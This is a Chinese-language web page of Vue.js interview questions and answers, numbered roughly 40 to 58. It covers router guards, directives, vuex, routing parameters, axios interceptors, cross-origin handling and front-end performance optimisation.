<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">钩子函数有三种 ,也叫路由守卫</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">全局导航钩子（跳转前进行判断拦截）  全局路由守卫</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">router.beforeEach(to, from, next),全局前置守卫</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">router.beforeResolve(to, from, next),全局的解析守卫</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">router.afterEach(to, from ,next) 全局的后置守卫</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">组件内钩子    路由独享的守卫</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">beforeRouteEnter</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">beforeRouteUpdate</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">beforeRouteLeave </span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">单独路由独享组件</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">beforeEnter   组件内的守卫</span></span></p> 
<h2 id="40.%E5%8F%8C%E5%90%91%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A%E7%9A%84%E7%90%86%E8%A7%A3%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">40.双向数据绑定的理解？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">vue采用数据劫持结合发布者-订阅者模式的方式，通过 Object.defineProperty劫持data属性的setter，getter，在数据变动时发布消息给订阅者，触发相应的监听回调。</span></span></p> 
<h2 id="41.vue%E7%BB%84%E4%BB%B6%E4%B8%ADdata%E4%B8%BA%E4%BB%80%E4%B9%88%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E4%B8%80%E4%B8%AA%E5%AF%B9%E8%B1%A1" style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7">41.vue组件中data为什么函数返回一个对象</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">组件中的data写成一个函数，数据以函数返回值形式定义，这样每复用一次组件，就会返回一份新的data。如果单纯的写成对象形式，就使得所有组件实例共用了一份data，造成了数据污染。</span></span></p> 
<h2 id="42.vue%E4%B8%AD%E5%93%AA%E4%BA%9B%E6%95%B0%E7%BB%84%E6%96%B9%E6%B3%95%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%AF%B9%E6%95%B0%E7%BB%84%E4%BF%AE%E6%94%B9%E5%AE%9E%E7%8E%B0%E8%A7%86%E5%9B%BE%E6%9B%B4%E6%96%B0" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">42.vue中哪些数组方法可以直接对数组修改实现视图更新</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">push() pop() shift() unshift() splice() sort() reverse() vue数组对象修改触发视图更新</span></span></p> 
<h2 id="43.%E6%9C%89%E5%93%AA%E4%BA%9B%E6%8C%87%E4%BB%A4%EF%BC%9Fv-if%E5%92%8Cv-show%E5%8C%BA%E5%88%AB%EF%BC%8Cv-if%E3%80%81v-for%E4%BC%98%E5%85%88%E7%BA%A7" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">43.有哪些指令？v-if和v-show区别，v-if、v-for优先级</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-html   //html</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-text   //元素里要显示的内容</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-bind：data    //绑定动态数据   ：data</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-on：click      //绑定事件       @click</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-for</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-if //条件渲染指令</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-model    //双向绑定，用于表单</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-show通过css display控制显示和隐藏，v-if组件真正的渲染好饿销毁，而不是显示和隐藏，频繁切换状态使用v-show 否则v-if</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-for和v-if不应该一起使用，必要情况下应该替换成computed属性。原因：v-for比v-if优先，如果每一次都需要遍历整个数组，将会影响速度，尤其是当之需要渲染很小一部分的时候。</span></span></p> 
<h2 id="44.v-for%E4%B8%ADkey%20%E7%9A%84%E4%BD%9C%E7%94%A8" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">44.v-for中key 的作用</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">快速查找到节点，减少渲染次数，提升渲染性能</span></span></p> 
<h2 id="45.%E4%BD%BF%E7%94%A8%E8%BF%87keep-alive%E5%90%97" style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7">45.使用过keep-alive吗</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">keep-alive缓存vue实例，提高性能是 Vue 内置的一个组件，可以使被包含的组件保留状态，避免重新渲染 ，</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">提供 include 和 exclude 属性，两者都支持字符串或正则表达式， include 表示只有名称匹配的组件会被缓存，exclude 表示任何名称匹配的组件都不会被缓存 ，其中 exclude 的优先级比 include 高； </span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">对应两个钩子函数 activated 和 deactivated ，当组件被激活时，触发钩子函数 activated，当组件被移除时，触发钩子函数 deactivated。</span></span></p> 
<h2 id="46.computed%E3%80%81watch%EF%BC%88%E8%87%AA%E5%8A%A8%E7%9B%91%E5%90%AC%E3%80%81%E6%B7%B1%E5%BA%A6%E7%9B%91%E5%90%AC%EF%BC%89%E3%80%81methods%E5%8C%BA%E5%88%AB" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">46.computed、watch（自动监听、深度监听）、methods区别</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">我们可以将同一函数定义为一个 method 或者一个计算属性。对于最终的结果，两种方式是相同的。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">不同点：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">computed</span></span><span style="background-color:#f8f8f8"><span style="color:#333333">：计算属性是基于它们的依赖进行缓存的，只有在它的相关依赖发生改变时才会重新求值。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fff5e6">methods</span></span><span style="background-color:#f8f8f8"><span style="color:#333333">：只要发生重新渲染， method 调用总会执行该函数。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#edf6e8">watch</span></span><span style="background-color:#f8f8f8"><span style="color:#333333">监听对象需要深度监听，默认是浅监听</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">当页面中有某些数据依赖其他数据进行变动的时候，可以使用计算属性computed。 </span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">watch用于观察和监听页面上的vue实例，如果要在数据变化的同时进行异步操作或者是比较大的开销，那么watch为最佳选择。</span></span></p> 
<h2 id="47.vue%E4%B8%AD%E5%AF%B9%E8%B1%A1%E6%9B%B4%E6%94%B9%E6%A3%80%E6%B5%8B%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9" style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7">47.vue中对象更改检测的注意事项</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">由于 JavaScript 的限制，Vue 不能检测对象属性的添加或删除：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">对于已经创建的实例，Vue 不能动态添加根级别的响应式属性。但是，可以使用 `Vue.set(object, key, value)`方法向嵌套对象`添加响应式属性`。为已有对象赋予多个新属性，比如使用 `Object.assign()`或 `_.extend()`。在这种情况下，你应该用两个对象的属性创建一个新的对象。</span></span></p> 
<h2 id="48.%E4%BB%80%E4%B9%88%E6%98%AF%24nextTick%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#fe2c24">48.什么是$nextTick？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">场景：vue是异步渲染的框架，react也是，data改变之后，dom不会立刻渲染，$nextTick会在dom渲染之后被触发，以获取最新dom节点</span></span></p> 
<h2 id="49.ref%20%E7%9A%84%E4%BD%9C%E7%94%A8%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">49.ref 的作用？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">获取dom元素 this.$refs.box</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">获取子组件中的data this.$refs.box.msg</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">调用子组件中的方法 this.$refs.box.open()</span></span></p> 
<h2 id="50.%E4%BB%80%E4%B9%88%E6%98%AFvuex%EF%BC%9Fvuex%E6%A0%B8%E5%BF%83%E5%8C%85%E6%8B%AC%EF%BC%9F%E6%80%8E%E4%B9%88%E4%BF%AE%E6%94%B9state%E4%B8%AD%E6%95%B0%E6%8D%AE%EF%BC%9F%E5%9C%A8%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%93%AA%E9%87%8C%E4%BD%BF%E7%94%A8%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">50.什么是vuex？vuex核心包括？怎么修改state中数据？在项目中哪里使用？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">vuex 是一个专门为 vue 构建的状态管理工具，主要是为了解决 多组间之间状态共享问题。强调的是集中式管理，（组件与组件之间的关系变成了组件与仓库之间的关系）</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">vuex 的核心包括：state（存放状态）、mutations（同步的更改状态）、actions（发送异步请求，拿到数据）、getters（根据之前的状态派发新的状态）、modules（模块划分）</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">state 发布一条新的数据，在 getters 里面根据状态派发新的状态，actions 发送异步请求获取数据，然后在 mutations 里面同步的更改数据</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">　　应用场合：购物车的数据共享、登入注册</span></span></p> 
<h2 id="51.%E8%B7%AF%E7%94%B1%E6%A8%A1%E5%BC%8F%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F%E8%B7%AF%E7%94%B1%E4%BC%A0%E5%8F%82%E6%9C%89%E5%93%AA%E4%BA%9B%E6%96%B9%E5%BC%8F%EF%BC%9F%E8%B7%AF%E7%94%B1%E5%AE%88%E5%8D%AB%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%8C%E6%9C%89%E6%B2%A1%E6%9C%89%E5%9C%A8%E9%A1%B9%E7%9B%AE%E4%B8%AD%E4%BD%BF%E7%94%A8%E8%BF%87%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">51.路由模式有哪些？路由传参有哪些方式？路由守卫有哪些，有没有在项目中使用过？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">hash模式（默认） 例如：http://abc.com/#/user/10</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">h5 history模式  例如：http://abc.com/user/20 需要server端支持</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">注意：history有如下问题 404</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">路由传参方法？</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">query传参和params传参</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">1、声明式导航</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">不带参跳转 对应的地址为/foo</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">url字符串拼接传参 对应的地址为/foo?id=123</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">query方式对象形式传参 对应的地址为/foo?id=123</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">params方式对象形式传参 对应地址为 /path/123 , 注意params和query一起使用params会失效，params与name一起使用</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">2、编程式导航(路由实例对象router=new VueRouter())</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">字符串router.push('home')</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">对象router.push({ path: 'home' })</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">命名的路由 对应路径为/path/123</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">router.push({ name: 'user', params: { userId: '123' }})</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">带查询参数，变成 /register?plan=123</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">router.push({ path: 'register', query: { plan: '123' }})</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">接收参数</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">this.$route.params.id</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">this.$route.query.xxx</span></span></p> 
<h2 id="52.vue%E8%BF%87%E6%BB%A4%E5%99%A8" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">52.vue过滤器</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">过滤器是将后台返回的数据换一种形式输出，不改变原来的数据 应用场景:后台返回的状态码（性别，支付状态），商品价格</span></span></p> 
<h3 id="1.%20%E5%85%A8%E5%B1%80%E8%BF%87%E6%BB%A4%E5%99%A8%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0" style="margin-left:.0001pt;text-align:left"><span style="color:#956fe7"><span style="background-color:#f8f8f8">1. 全局过滤器                                                         </span></span></h3> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">Vue.filter('过滤器',对应的过滤器函数)</span></span></p> 
<h3 id="2.%E5%B1%80%E9%83%A8%E8%BF%87%E6%BB%A4%E5%99%A8" style="margin-left:.0001pt;text-align:left"><span style="color:#fe2c24"><span style="background-color:#fefcd8">2.局部过滤器</span></span></h3> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">通过在Vue实例上挂载filers添加过滤器，只能在当前组件内部使用</span></span></p> 
<h2 id="53.%E6%9C%89%E6%B2%A1%E6%9C%89%E5%B0%81%E8%A3%85%E8%BF%87%E7%BB%84%E4%BB%B6%EF%BC%8C%E5%B0%81%E8%A3%85%E8%BF%87%E4%BB%80%E4%B9%88%EF%BC%8C%E6%80%8E%E4%B9%88%E5%B0%81%E8%A3%85%EF%BC%9F%E6%B3%A8%E6%84%8F%E7%82%B9%E6%88%96%E6%9C%89%E5%93%AA%E4%BA%9B%E5%8E%9F%E5%88%99%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">53.有没有封装过组件，封装过什么，怎么封装？注意点或有哪些原则？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">怎么封装：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">● </span></span><span style="color:#333333"><span style="background-color:#fefcd8">首先</span></span><span style="background-color:#f8f8f8"><span style="color:#333333">，使用Vue.extend()创建一个组件</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">● </span></span><span style="color:#333333"><span style="background-color:#edf6e8">然后</span></span><span style="background-color:#f8f8f8"><span style="color:#333333">，使用Vue.component()方法注册组件</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">● </span></span><span style="color:#333333"><span style="background-color:#fefcd8">接着</span></span><span style="background-color:#f8f8f8"><span style="color:#333333">，如果子组件需要数据，可以在props中接受定义</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">● </span></span><span style="color:#333333"><span style="background-color:#fefcd8">最后</span></span><span style="background-color:#f8f8f8"><span style="color:#333333">，子组件修改好数据之后，想把数据传递给父组件，可以使用emit()方法</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333">注意点或有哪些原则？</span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">data数据结构设计，或者问有哪些原则</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">原则：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">1.用数据描述所有的内容</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">2.数据要结构化，易于程序操作，遍历，查找</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">3.数据要可扩展，以便增加新的功能</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">组件如何设计，有什么原则</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">原则：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">1.从功能上拆分层次</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">2.尽量让组件原子化，一个组件只做一件事情</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">3.容器组件（只管数据，一般是顶级组件）和展示组件（只管显示视图）</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333">54.移动端项目如何适配（rem）？</span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">css3规定：1rem的大小就是根元素&lt;html&gt;的font-size的值。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">   通过设置 根元素&lt;html&gt;的font-size的大小，来控制整个html文档内的字体大小、元素宽高、内外边距等，</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">   根据移动设备的宽度大小来实现自适应，不同的设备都展示一致的页面效果。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">rem布局简单分析 分三步：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">第一步：前端开发者首先拿到UI设计原型稿的宽度，750宽度，如 320px 或者640px或者750px;</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">第二步：增加脚本（设置根元素&lt;html&gt;字体大小）</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">第三步：css中使用rem单位；关键点：字体大小，元素宽高，内外边距一定是根据设计稿测量得来的。</span></span></p> 
<h2 id="55.%E6%9C%89%E6%B2%A1%E6%9C%89%E4%BD%BF%E7%94%A8%E8%BF%87axios%E3%80%81axios%E6%8B%A6%E6%88%AA%E5%99%A8%EF%BC%8C%E8%B7%A8%E5%9F%9F%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#fe2c24">55.有没有使用过axios、axios拦截器，跨域如何解决？</span></h2> 
<pre><code>axios拦截器：

// 添加请求拦截器

axios.interceptors.request.use

// 添加响应拦截器

axios.interceptors.response.use</code></pre> 
<p style="margin-left:.0001pt;text-align:left"></p> 
<p style="margin-left:.0001pt;text-align:left"><strong><span style="background-color:#f8f8f8"><span style="color:#333333">跨域特别注意两点：</span></span></strong></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">第一</span></span><span style="color:#333333"><span style="background-color:#fefcd8">，如果是协议和端口造成的跨域问题“前台”是无能为力的，</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">第二：在跨域问题上，域仅仅是通过“URL的首部”来识别而不会去尝试判断相同的ip地址对应着两个域或两个域是否在同一个ip上。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">vue如何解决跨域：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">proxyTable   这里vue脚手架生成的标准项目为准。一般在项目config目录下面有个index文件</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">CORS   CORS即跨源资源共享，它定义了一种浏览器和服务器交互的方式来确定是否允许跨域请求。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">Nginx  当我们明白跨越的含义之后。只要解决了'源'的问题。那么跨越也就不存在了</span></span></p> 
<h2 id="56.vue%E9%A1%B9%E7%9B%AE%E5%81%9A%E8%BF%87%E5%93%AA%E4%BA%9B%E4%BC%98%E5%8C%96" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">56.vue项目做过哪些优化</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">（1）代码层面的优化 </span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-if 和 v-show 区分使用场景</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">computed 和 watch  区分使用场景</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">v-for 遍历必须为 item 添加 key，且避免同时使用 v-if</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">长列表性能优化</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">事件的销毁 addEventlisenter 事件监听</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">图片资源懒加载</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">路由懒加载</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">第三方插件的按需引入</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">优化无限列表性能</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">服务端渲染 SSR or 预渲染</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">（2）Webpack 层面的优化</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">Webpack 对图片进行压缩</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">减少 ES6 转为 ES5 的冗余代码</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">提取公共代码</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">模板预编译</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">提取组件的 CSS</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">优化 SourceMap</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">构建结果输出分析</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">Vue 项目的编译优化 </span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">（3）基础的 Web 技术的优化</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">开启 gzip 压缩</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">浏览器缓存</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">CDN 的使用</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">使用 Chrome Performance 查找性能瓶颈</span></span></p> 
<h2 id="57.%E4%B8%BA%E4%BB%80%E4%B9%88%E5%81%9A%E9%A6%96%E5%B1%8F%E4%BC%98%E5%8C%96%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">57.为什么做首屏优化？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="color:#333333"><span style="background-color:#fefcd8">首屏时间的快与慢</span></span><span style="background-color:#f8f8f8"><span style="color:#333333">，直接影响到了</span></span><span style="color:#333333"><span style="background-color:#fefcd8">用户对网站的认知度</span></span><span style="background-color:#f8f8f8"><span style="color:#333333">。所以首屏时间的长短对于用户的滞留时间的长短、用户转化率都尤为重要。</span></span></p> 
<h2 id="58.%E5%A6%82%E4%BD%95%E5%81%9A%E9%A6%96%E5%B1%8F%E4%BC%98%E5%8C%96%EF%BC%9F" style="margin-left:.0001pt;text-align:left"><span style="color:#38d8f0">58.如何做首屏优化？</span></h2> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">css模块化加载，对应模块下的css交给js或jsonp请求返回</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">js懒执行，有交互才执行</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">图片在其他屏（非首屏）都采用懒加载的模式，这样既能节省流量，也能减少请求数或延迟请求数。</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"><span style="background-color:#f8f8f8"><span style="color:#333333">服务器方面：</span></span></p> 
<p style="margin-left:.0001pt;text-align:left"></p> 
